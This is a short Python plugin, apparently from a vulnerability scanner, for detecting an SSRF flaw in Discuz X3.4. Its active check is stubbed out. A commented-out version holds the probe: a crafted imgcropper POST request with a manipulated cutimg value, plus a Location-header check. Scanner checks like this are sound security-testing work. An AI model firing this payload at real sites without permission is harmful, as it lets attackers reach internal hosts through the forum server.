#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

'''
discuz x3.4 ssrf
https://zhuanlan.zhihu.com/p/51907363
'''

def info(data):
    info = {
        "name": "discuz x3.4 ssrf",
        "info": "discuz x3.4 ssrf",
        "level": "high",
        "type": "ssrf",
    }
    return info

def prove(data):
    return data
#
# def prove(data):
#     init(data,'discuz')
#     if data['base_url']:
#         url = data[ 'base_url'] + "misc.php?mod=imgcropper&picflag=2&cutimg=/:@localhost:80/dz-imgcropper-ssrf"
#         _data = 'imgcroppersubmit=1&formhash=f8472648' # formhash=f8472648从网页home.php?mod=spacecp&ac=pm     input标签 name=formhash 的value中取
#         res = curl('post', url,data = _data)
#         if res != None and "location".lower() in res.headers.keys() and 'http://localhost#@www.baidu.com' in res.headers['location']:
#             pass # 直接请求，需联通dnslog
#             # data['flag'] = 1
#             # data['data'].append({"flag": url})
#             # data['res'].append({"info": url, "key": "discuz x3.4 ssrf"})
#     return data
#
# if __name__=='__main__':
#     from script import init, curl
#     print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))